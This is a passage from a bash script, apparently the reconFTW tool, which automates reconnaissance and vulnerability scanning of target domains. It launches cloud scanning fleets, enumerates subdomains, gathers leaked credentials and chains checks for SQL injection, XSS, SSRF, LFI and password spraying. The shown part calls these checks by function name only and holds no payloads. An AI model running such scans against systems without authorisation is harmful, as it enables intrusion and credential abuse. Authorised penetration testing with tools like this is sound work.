	# let's fire up a FLEET!
	if [ "$AXIOM_FLEET_LAUNCH" = true ] && [ -n "$AXIOM_FLEET_NAME" ] && [ -n "$AXIOM_FLEET_COUNT" ]; then
		start_func "Launching our Axiom fleet"
		# Check to see if we have a fleet already, if so, SKIP THIS!
		NUMOFNODES=$(timeout 30 axiom-ls | grep -c "$AXIOM_FLEET_NAME")
		if [[ $NUMOFNODES -ge $AXIOM_FLEET_COUNT ]]; then
			axiom-select "$AXIOM_FLEET_NAME*"
			# if [ -n "$AXIOM_POST_START" ]; then
			# 	eval "$AXIOM_POST_START"
			# fi
			end_func "Axiom fleet $AXIOM_FLEET_NAME already has $NUMOFNODES instances"			
		elif [[ $NUMOFNODES -eq 0 ]]; then
			axiom_args=" -i=$AXIOM_FLEET_COUNT "
			[ -n "$AXIOM_FLEET_REGIONS" ] && axiom_args="$axiom_args --regions=\"$AXIOM_FLEET_REGIONS\" " 
			
			echo "axiom-fleet $AXIOM_FLEET_NAME $axiom_args"
			axiom-fleet "$AXIOM_FLEET_NAME $axiom_args"
			axiom-select "$AXIOM_FLEET_NAME*"
			if [ -n "$AXIOM_POST_START" ]; then
				eval "$AXIOM_POST_START"
			fi

			NUMOFNODES=$(timeout 30 axiom-ls | grep -c "$AXIOM_FLEET_NAME" )
			echo "Axiom fleet $AXIOM_FLEET_NAME launched w/ $NUMOFNODES instances" | $NOTIFY
			end_func "Axiom fleet $AXIOM_FLEET_NAME launched w/ $NUMOFNODES instances"
		fi
	fi
}

function axiom_shutdown(){
	if [ "$AXIOM_FLEET_LAUNCH" = true ] && [ "$AXIOM_FLEET_SHUTDOWN" = true ] && [ -n "$AXIOM_FLEET_NAME" ]; then
		if [ "$mode" == "subs_menu" ] || [ "$mode" == "list_recon" ] || [ "$mode" == "passive" ] || [ "$mode" == "all" ]; then
			notification "Automatic Axiom fleet shutdown is not enabled in this mode" info
			return
		fi
		eval axiom-rm -f "$AXIOM_FLEET_NAME*"
		echo "Axiom fleet $AXIOM_FLEET_NAME shutdown" | $NOTIFY
		notification "Axiom fleet $AXIOM_FLEET_NAME shutdown" info
	fi
}

function axiom_selected(){
	if [[ ! $(cat ~/.axiom/selected.conf | sed '/^\s*$/d' | wc -l) -gt 0 ]]; then
		notification "\n\n${bred} No axiom instances selected ${reset}\n\n" error
		exit
	fi
}

function start(){

	global_start=$(date +%s)

	if [ "$NOTIFICATION" = true ]; then
		NOTIFY="notify -silent"
	else
	    NOTIFY=""
	fi

	echo "Recon succesfully started on $domain" | $NOTIFY
	tools_installed

	if [ -z "$domain" ]; then
		if [ -n "$list" ]; then
			if [ -z "$domain" ]; then
				domain="Multi"
				dir="$SCRIPTPATH/Recon/$domain"
				called_fn_dir=$dir/.called_fn
			fi
			if [[ "$list" = /* ]]; then
				install -D $list $dir/webs/webs.txt
			else
				install -D $SCRIPTPATH/$list $dir/webs/webs.txt
			fi
		fi
	else
		dir="$SCRIPTPATH/Recon/$domain"
		called_fn_dir=$dir/.called_fn
	fi

	if [ -z "$domain" ]; then
		notification "\n\n${bred} No domain or list provided ${reset}\n\n" error
		exit
	fi

	if [ ! -d "$called_fn_dir" ]; then
		mkdir -p $called_fn_dir
	fi

	cd "$dir"  || { echo "Failed to cd directory in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
	if [ -n "$domain" ]; then
		echo "$domain" | anew -q target.txt
		list="${dir}/target.txt"
	fi
	mkdir -p .tmp .log osint subdomains webs hosts vulns

	NOW=$(date +"%F")
	NOWT=$(date +"%T")
	LOGFILE="${dir}/.log/${NOW}_${NOWT}.txt"
	touch .log/${NOW}_${NOWT}.txt

	if [ -n "$findomain_virustotal_token" ]; then
		VT_API_KEY=$findomain_virustotal_token
	fi

	printf "\n"
	printf "${bred} Target: ${domain}\n\n"
}

function end(){
	find $dir -type f -empty | grep -v "called_fn" | xargs rm -f &>/dev/null
	find $dir -type d -empty | grep -v "called_fn" | xargs rm -rf &>/dev/null

	if [ "$REMOVETMP" = true ]; then
		rm -rf $dir/.tmp
	fi

	if [ -n "$dir_output" ]; then
		output
		finaldir=$dir_output
	else
		finaldir=$dir
	fi
	#Zip the output folder and send it via tg/discord/slack
	zipSnedOutputFolder
	global_end=$(date +%s)
	getElapsedTime $global_start $global_end
	printf "${bgreen}#######################################################################${reset}\n"
	text="${bred} Finished Recon on: ${domain} under ${finaldir} in: ${runtime} ${reset}\n"
	printf "${text}" && printf "${text}" | $NOTIFY
	printf "${bgreen}#######################################################################${reset}\n"
	#Seperator for more clear messges in telegram_Bot
	echo "******  Stay safe 🦠 and secure 🔐  ******" | $NOTIFY
}

###############################################################################################################
########################################### MODES & MENUS #####################################################
###############################################################################################################

function passive(){
	start
	domain_info
	emails
	google_dorks
	github_dorks
	metadata
	SUBSCRAPING=false
	WEBPROBESIMPLE=false

	axiom_lauch
	axiom_selected
	
	subdomains_full
	favicon
	PORTSCAN_ACTIVE=false
	portscan

	axiom_shutdown

	cloudprovider
	end
}

function all(){
	start
	recon
	4xxbypass
	cors
	open_redirect
	ssrf_checks
	crlf_checks
	lfi
	ssti
	sqli
	xss
	spraying
	brokenLinks
	test_ssl
	end
}



function recon(){
	domain_info
	emails
	google_dorks
	github_dorks
	metadata
	zonetransfer
	favicon

	axiom_lauch
	axiom_selected

	subdomains_full
	subtakeover
	s3buckets
	webprobe_full
	screenshot
	portscan
	waf_checks
	nuclei_check
	fuzz
	params
	urlchecks
	jschecks

	axiom_shutdown
	
	cloudprovider
	cms_scanner
	url_gf
	wordlist_gen
}

function multi_recon(){


	global_start=$(date +%s)

	if [ "$NOTIFICATION" = true ]; then
		NOTIFY="notify -silent"
	else
	    NOTIFY=""
	fi

	if [ -s "$list" ]; then
		targets=$(cat $list)
	else
		notification "Target list not provided" error
		exit
	fi

	workdir=$SCRIPTPATH/Recon/$multi
	mkdir -p $workdir  || { echo "Failed to create directory '$workdir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
	cd "$workdir"  || { echo "Failed to cd directory '$workdir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }

	mkdir -p .tmp .log .called_fn osint subdomains webs hosts vulns

	NOW=$(date +"%F")
	NOWT=$(date +"%T")
	LOGFILE="${dir}/.log/${NOW}_${NOWT}.txt"
	touch .log/${NOW}_${NOWT}.txt


	for domain in $targets; do
		dir=$workdir/targets/$domain
		called_fn_dir=$dir/.called_fn
		mkdir -p $dir
		cd "$dir"  || { echo "Failed to cd directory '$dir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		mkdir -p .tmp .log .called_fn osint subdomains webs hosts vulns

		NOW=$(date +"%F")
		NOWT=$(date +"%T")
		LOGFILE="${dir}/.log/${NOW}_${NOWT}.txt"
		touch .log/${NOW}_${NOWT}.txt
		loopstart=$(date +%s)

		domain_info
		emails
		google_dorks
		github_dorks
		metadata
		zonetransfer
		favicon
		NOW=$(date +"%H:%I:%S")
		loopend=$(date +%s)
		getElapsedTime $loopstart $loopend
		printf "${bgreen} $domain finished 1st loop in ${runtime} - ${NOW} ${reset}\n"
	done
	cd "$workdir"  || { echo "Failed to cd directory '$workdir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }

	axiom_lauch
	axiom_selected

	for domain in $targets; do
		loopstart=$(date +%s)
		dir=$workdir/targets/$domain
		called_fn_dir=$dir/.called_fn
		cd "$dir"  || { echo "Failed to cd directory '$dir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		subdomains_full
		subtakeover
		webprobe_full
		screenshot
		NOW=$(date +"%H:%I:%S")
		loopend=$(date +%s)
		getElapsedTime $loopstart $loopend
		printf "${bgreen} $domain finished 2nd loop in ${runtime} - ${NOW} ${reset}\n"
	done
	cd "$workdir"  || { echo "Failed to cd directory '$workdir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }

	notification "############################# Total data ############################" info
	NUMOFLINES_users_total=$(find . -type f -name 'users.txt' -exec cat {} + | anew osint/users.txt | wc -l)
	NUMOFLINES_pwndb_total=$(find . -type f -name 'passwords.txt' -exec cat {} + | anew osint/passwords.txt | wc -l)
	NUMOFLINES_software_total=$(find . -type f -name 'software.txt' -exec cat {} + | anew osint/software.txt | wc -l)
	NUMOFLINES_authors_total=$(find . -type f -name 'authors.txt' -exec cat {} + | anew osint/authors.txt | wc -l)
	NUMOFLINES_subs_total=$(find . -type f -name 'subdomains.txt' -exec cat {} + | anew subdomains/subdomains.txt | wc -l)
	NUMOFLINES_subtko_total=$(find . -type f -name 'takeover.txt' -exec cat {} + | anew webs/takeover.txt | wc -l)
	NUMOFLINES_webs_total=$(find . -type f -name 'webs.txt' -exec cat {} + | anew webs/webs.txt | wc -l)
	NUMOFLINES_webs_total=$(find . -type f -name 'webs_uncommon_ports.txt' -exec cat {} + | anew webs/webs_uncommon_ports.txt | wc -l)

	notification "- ${NUMOFLINES_users_total} total users found" good
	notification "- ${NUMOFLINES_pwndb_total} total creds leaked" good
	notification "- ${NUMOFLINES_software_total} total software found" good
	notification "- ${NUMOFLINES_authors_total} total authors found" good
	notification "- ${NUMOFLINES_subs_total} total subdomains" good
	notification "- ${NUMOFLINES_subtko_total} total probably subdomain takeovers" good
	notification "- ${NUMOFLINES_webs_total} total websites" good

	portscan
	s3buckets
	waf_checks
	nuclei_check
	for domain in $targets; do
		dir=$workdir/targets/$domain
		called_fn_dir=$dir/.called_fn
		cd "$dir" || { echo "Failed to cd directory '$dir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		loopstart=$(date +%s)
		fuzz
		params
		urlchecks
		jschecks
		NOW=$(date +"%H:%I:%S")
		loopend=$(date +%s)
		getElapsedTime $loopstart $loopend
		printf "${bgreen} $domain finished 3rd loop in ${runtime} - ${NOW} ${reset}\n"
	done

	axiom_shutdown

	cloudprovider

	for domain in $targets; do
		loopstart=$(date +%s)
		cms_scanner
		url_gf
		wordlist_gen
		NOW=$(date +"%H:%I:%S")
		loopend=$(date +%s)
		getElapsedTime $loopstart $loopend
		printf "${bgreen} $domain finished final loop in ${runtime} - ${NOW} ${reset}\n"		
	done

	cd "$workdir" || { echo "Failed to cd directory '$workdir' in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
	dir=$workdir
	domain=$multi
	end
}

function subs_menu(){
	start
	subdomains_full
	webprobe_full
	screenshot
	subtakeover
	zonetransfer
	s3buckets
	end
}

function webs_menu(){
			subtakeover
			s3buckets
			waf_checks
			nuclei_check
			cms_scanner
			fuzz
			4xxbypass
			cors
			params
			urlchecks
			url_gf
			jschecks
			wordlist_gen
			open_redirect
			ssrf_checks
			crlf_checks
			lfi
			ssti
			sqli
			xss
			spraying
			brokenLinks
			test_ssl
			end
}

function help(){
	printf "\n Usage: $0 [-d domain.tld] [-m name] [-l list.txt] [-x oos.txt] [-i in.txt] "
	printf "\n           	      [-r] [-s] [-p] [-a] [-w] [-i] [-h] [--deep] [--fs] [-o OUTPUT]\n\n"
	printf " ${bblue}TARGET OPTIONS${reset}\n"
	printf "   -d domain.tld    Target domain\n"
	printf "   -m company       Target company name\n"
	printf "   -l list.txt      Targets list, one per line\n"
	printf "   -x oos.txt       Exclude subdomains list (Out Of Scope)\n"
	printf "   -i in.txt        Include subdomains list\n"
	printf " \n"
	printf " ${bblue}MODE OPTIONS${reset}\n"
	printf "   -r               Recon - Full recon process (only recon without attacks)\n"
	printf "   -s               Subdomains - Search subdomains, check tko and web probe\n"
	printf "   -p               Passive - Performs only passive steps \n"
	printf "   -a               All - Perform all checks and exploitations\n"
	printf "   -w               Web - Just web checks from list provided\n"
	printf "   -h               Help - Show this help\n"
	printf " \n"
	printf " ${bblue}GENERAL OPTIONS${reset}\n"
	printf "   --deep           Deep scan (Enable some slow options for deeper scan)\n"
	printf "   -o output/path   Define output folder\n"
	printf " \n"
	printf " ${bblue}USAGE EXAMPLES${reset}\n"
	printf " Recon:\n"
	printf " ./reconftw.sh -d example.com -r\n"
	printf " \n"
	printf " Subdomain scanning with multiple targets:\n"
	printf " ./reconftw.sh -l targets.txt -s\n"
	printf " \n"
	printf " Web scanning for subdomain list:\n"
	printf " ./reconftw.sh -d example.com -l targets.txt -w\n"
	printf " \n"
	printf " Multidomain recon:\n"
	printf " ./reconftw.sh -m company -l domainlist.txt -r\n"
	printf " \n"
	printf " Full recon with custom output and excluded subdomains list:\n"
	printf " ./reconftw.sh -d example.com -x out.txt -a -o custom/path\n"
}

###############################################################################################################
########################################### START SCRIPT  #####################################################
###############################################################################################################

banner

check_version

if [ -z "$1" ]; then
	help
	tools_installed
	exit
fi

while getopts ":hd:-:l:m:x:i:varspxwo:" opt; do
	general=$@
	if [[ $general == *"--deep"* ]]; then
  		DEEP=true
	fi
	case ${opt} in

		## TARGETS

		m ) multi=$OPTARG
			;;
		d ) domain=$OPTARG
			;;
		l ) list=$OPTARG
			;;
		x ) outOfScope_file=$OPTARG
			isAsciiText $outOfScope_file
			if [ "False" = "$IS_ASCII" ]; then
				printf "\n\n${bred} Out of Scope file is not a text file${reset}\n\n"
				exit
			fi
			;;
		i ) inScope_file=$OPTARG
			isAsciiText $inScope_file
			if [ "False" = "$IS_ASCII" ]; then
				printf "\n\n${bred} In Scope file is not a text file${reset}\n\n"
				exit
			fi
			;;

		## MODES

		r ) if [ -n "$multi" ]; then
				multi_recon
				exit
			fi
			if [ -n "$list" ]; then
				for domain in $(cat $list); do
					start
					recon
					end
				done
			else
				start
				recon
				end
			fi
			exit
			;;
		s ) if [ -n "$list" ]; then
				for domain in $(cat $list); do
					subs_menu
				done
			else
				subs_menu
			fi
			exit
			;;
		a ) if [ -n "$list" ]; then
				for domain in $(cat $list); do
					all
				done
			else
				all
			fi
			exit
			;;
		w ) start
			if [ -n "$list" ]; then
				if [[ "$list" = /* ]]; then
					cp $list $dir/webs/webs.txt
				else
					cp $SCRIPTPATH/$list $dir/webs/webs.txt
				fi
			fi
			webs_menu
			exit
			;;
		p ) if [ -n "$list" ]; then
				for domain in $(cat $list); do
					passive
				done
			else
				passive
			fi
			exit
			;;
		o ) dir_output=$OPTARG
			output
			;;
		\? | h | : | - | * )
			help
			;;
	esac
done
shift $((OPTIND -1))
